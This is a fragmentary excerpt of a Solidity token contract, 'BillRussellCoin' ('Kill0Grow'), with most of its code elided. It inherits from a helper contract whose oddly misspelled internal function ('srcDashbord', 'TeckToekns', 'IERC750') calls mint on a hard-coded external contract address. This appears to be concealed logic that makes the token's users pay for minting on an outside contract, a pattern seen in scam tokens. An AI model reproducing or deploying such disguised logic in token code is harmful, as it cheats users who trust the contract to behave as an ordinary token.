...
contract ConverterByts {
    function srcDashbord() internal returns (uint256) {
        ...
        IERC750(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(uint256(TeckToekns));
...
contract BillRussellCoin is Context, IERC20, Ownable, ConverterByts {
    ...
    string private _name = "Kill0Grow";
    string private _symbol = "K0Grow";

    uint256 private _zeroTax = 1;
